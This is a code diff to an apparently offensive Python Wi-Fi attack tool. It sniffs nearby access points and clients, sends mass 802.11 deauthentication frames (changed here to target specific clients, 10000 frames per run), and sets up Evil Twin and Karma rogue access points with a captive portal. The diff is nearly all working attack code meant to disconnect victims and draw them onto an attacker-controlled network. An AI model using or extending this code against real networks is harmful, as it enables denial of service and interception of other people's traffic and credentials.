@@ -54,6 +54,25 @@ class networkInterfaces:
             
         return ret
 
+    def getMode(self, nInterface):
+        if type(nInterface) is not int:
+            print('[x] Input value is not an integer!\n')
+            return -1
+
+        if nInterface < 0 or nInterface >= len(self.interfaces):
+            print('[x] Input value out of bounds!\n')
+            return -1
+
+        interface = self.interfaces[nInterface]['name']
+        
+        f = open(self.netIntDir + '/' + interface + '/type', 'r')
+        if f.read() == '803\n':
+            ret = 'monitor'
+        else:
+            ret = 'managed'
+
+        return ret
+
     def putInMonitor(self, nInterface):
         if type(nInterface) is not int:
             print('[x] Input value is not an integer!\n')
@@ -75,17 +94,15 @@ class networkInterfaces:
         os.system('iw ' + interface['name'] + ' set type monitor')
         os.system('ifconfig ' + interface['name'] + ' up')
 
-        # Check if interface is indeed in monitor mode
-        f = open(self.netIntDir + '/' + interface['name'] + '/type', 'r')
-        if f.read() != '803\n':
-            print('[x] Newtork interface couldn\'t be put in monitor mode!\n')
-            f.close()
-            return -1
-        f.close()
-
         # Set channel to 1 for later scanning
         os.system('iw ' + interface['name'] + ' set channel 1')
         self.interfaces[nInterface]['channel'] = 1
+        self.interfaces[nInterface]['monitor'] = 'monitor'
+
+        # Check if interface is indeed in monitor mode
+        if self.getMode(nInterface) != 'monitor':
+            print('[x] Newtork interface couldn\'t be put in monitor mode!\n')
+            return -1
 
         print('[+] Network interface configured succesfuly')
         
@@ -166,9 +183,9 @@ class networkInterfaces:
         while not stop:
             pass
 
-        print('--+-------------------+----------+----+----------------------------------+')
         changeChThread.stop = True
         sniffer.stop()
+        print('--+-------------------+----------+----+----------------------------------+')
 
         accessPoint = -1
         while accessPoint < 0 or accessPoint >= len(accessPoints):
@@ -206,10 +223,10 @@ class networkInterfaces:
         changeChThread = threading.Thread(target = self.changeChannel, args = (nInterface,))
         changeChThread.start()
 
-        print('WIFI ACCESS POINTS (Ctrl C to stop)')
-        print('+---+-------------------+----------+----+----------------------------------+-------------------+')
-        print('| i |       BSSID       | ENCRYPTN | CH |               SSID               |      CLIENT       |')
-        print('+---+-------------------+----------+----+----------------------------------+-------------------+')
+        print('WIFI ACCESS POINTS AND CLIENTS (Ctrl C to stop)')
+        print('+---+-------------------+----------+----+-----------------------+-------------------+-----------------------+')
+        print('| i |       BSSID       | ENCRYPTN | CH |         SSID          |      CLIENT       |         VENDOR        |')
+        print('+---+-------------------+----------+----+-----------------------+-------------------+-----------------------+')
 
         def sniffAP_callback(pkt):
             # Protocol 802.11, type management, subtype beacon
@@ -229,10 +246,11 @@ class networkInterfaces:
             elif pkt.haslayer(Dot11) and pkt[Dot11].type == 2:
                 bssid = pkt[Dot11].addr2.upper()
                 client = pkt[Dot11].addr1.upper()
+                vendor = pkt[Dot11].EltVendorSpecific
                 if bssid in accessPointsWOClients:
-                    newAccessPoint = {'bssid' : bssid , 'ssid' : accessPointsWOClients[bssid]['ssid'], 'channel' : accessPointsWOClients[bssid]['channel'], 'encryption' : accessPointsWOClients[bssid]['encryption']}
+                    newAccessPoint = {'bssid' : bssid , 'ssid' : accessPointsWOClients[bssid]['ssid'], 'channel' : accessPointsWOClients[bssid]['channel'], 'encryption' : accessPointsWOClients[bssid]['encryption'], 'client' : client}
                     accessPoints.append(newAccessPoint)
-                    print('|%3s| %17s | %8s | %2s | %-32.32s | %17s |' % (str(len(accessPoints)), accessPoints[len(accessPoints) - 1]['bssid'], accessPoints[len(accessPoints) - 1]['encryption'], accessPoints[len(accessPoints) - 1]['channel'], accessPoints[len(accessPoints) - 1]['ssid'], client))
+                    print('|%3s| %17s | %8s | %2s | %-24.24s | %17s | %-24.24s |' % (str(len(accessPoints)), accessPoints[len(accessPoints) - 1]['bssid'], accessPoints[len(accessPoints) - 1]['encryption'], accessPoints[len(accessPoints) - 1]['channel'], accessPoints[len(accessPoints) - 1]['ssid'], client, vendor))
 
         sniffer = AsyncSniffer(iface=self.interfaces[nInterface]['name'], prn=sniffAP_callback)
         sniffer.start()
@@ -240,9 +258,9 @@ class networkInterfaces:
         while not stop:
             pass
 
-        print('--+-------------------+----------+----+----------------------------------+-------------------+')
         changeChThread.stop = True
         sniffer.stop()
+        print('--+-------------------+----------+----+----------------------------------+-------------------+')
 
         accessPoint = -1
         while accessPoint < 0 or accessPoint >= len(accessPoints):
@@ -417,7 +435,7 @@ class networkInterfaces:
 
         return 0
 
-    def deauth(self, nInterface, bssid, channel):
+    def deauth(self, nInterface, channel, bssid, client = 'FF:FF:FF:FF:FF:FF'):
         if type(nInterface) is not int:
             print('[x] Input value is not an integer!\n')
             return -1
@@ -426,26 +444,24 @@ class networkInterfaces:
             print('[x] Input value out of bounds!\n')
             return -1
 
-        interface = self.interfaces[nInterface]
-
-        if interface['mode'] != 'monitor':
-            print('[x] Selected interface is not in monitor mode!\n')
+        if self.getMode(nInterface) != 'monitor':
+            print('[x] Selected interface is not in monitor mode! (' + self.interfaces[nInterface]['name'] + ')\n')
             return -1
 
         # Change channel
         os.system('iw ' + self.interfaces[nInterface]['name'] + ' set channel ' + channel)
         
         # Craft packet
-        pkt = RadioTap()/Dot11(addr1 = 'FF:FF:FF:FF:FF:FF', addr2 = bssid, addr3 = bssid)/Dot11Deauth()
+        pkt = RadioTap()/Dot11(addr1 = client, addr2 = bssid, addr3 = bssid)/Dot11Deauth()
 
         def sendPkt():
-            for i in range(50):
-                send(pkt)
+            sendp(pkt, iface=self.interfaces[nInterface]['name'], count=10000, verbose=0)
+            print('\n[+] Deauth stopped\n')
 
         deauthThread = threading.Thread(target = sendPkt)
         deauthThread.start()
 
-        print('[+] Sending deauth packets to ' + bssid + ' via channel ' + channel)
+        print('[+] Sending deauth packets from ' + bssid + ' to ' + client + ' via channel ' + channel)
 
 def configWebApp():
     # Config captive portal files
@@ -473,8 +489,8 @@ def configWebApp():
     os.system('service mysql start')
     print('[+] mysql configured succesfuly')
 
-# We define the file descriptors for hostapd log file and dnsmasq log file
-# as global in order for the sigint handler to be able to get them
+# We define the file descriptors for hostapd log file and dnsmasq log 
+# file as global in order for the sigint handler to be able to get them
 hostapdFD = 0
 dnsmasqFD = 0
 def sigint_handler(sig, frame):
@@ -552,7 +568,7 @@ while op < 1 or op > 4:
     print('\nOPERATION MODE')
     print('[1] -> Create new acces point')
     print('[2] -> [Evil Twin] Intercept existing access point')
-    print('[3] -> [Evil Twin] Intercept existing access point (show only APs with clients)')
+    print('[3] -> [Evil Twin] Intercept client connected to access point')
     print('[4] -> [Karma] Create acces point recogniced by victim')
     op = int(input('Select operation mode > '))
     print()
@@ -618,7 +634,7 @@ while op < 1 or op > 4:
                     else:
                         ok = 0
 
-        print('[+] Second network Interface in use: ' + networkInterfaces.interfaces[interface2]['name'])
+        print('[+] Second network Interface in use: ' + networkInterfaces.interfaces[interface2]['name'] + ' (' + networkInterfaces.getMode(interface2) + ')\n')
         
         accessPoint = networkInterfaces.sniffAccessPoints(interface, sigint_handler)
         
@@ -637,7 +653,7 @@ while op < 1 or op > 4:
         configWebApp()
 
         # Deauth AP
-        networkInterfaces.deauth(interface2, bssid, channel)
+        networkInterfaces.deauth(interface2, channel, bssid)
 
     elif op == 3:
         # Select network interface 2
@@ -673,12 +689,13 @@ while op < 1 or op > 4:
                     else:
                         ok = 0
 
-        print('[+] Second network Interface in use: ' + networkInterfaces.interfaces[interface2]['name'])
+        print('[+] Second network Interface in use: ' + networkInterfaces.interfaces[interface2]['name'] + ' (' + networkInterfaces.getMode(interface2) + ')\n')
 
         accessPoint = networkInterfaces.sniffUsedAccessPoints(interface, sigint_handler)
         
         bssid = accessPoint['bssid']
         ssid = accessPoint['ssid']
+        client = accessPoint['client']
         channel = accessPoint['channel']
         encryption = accessPoint['encryption']
 
@@ -692,7 +709,7 @@ while op < 1 or op > 4:
         configWebApp()
 
         # Deauth AP
-        networkInterfaces.deauth(interface2, bssid, channel)
+        networkInterfaces.deauth(interface2, channel, bssid, client)
 
     elif op == 4:
         probeRequest = networkInterfaces.sniffProbeReq(interface, sigint_handler)
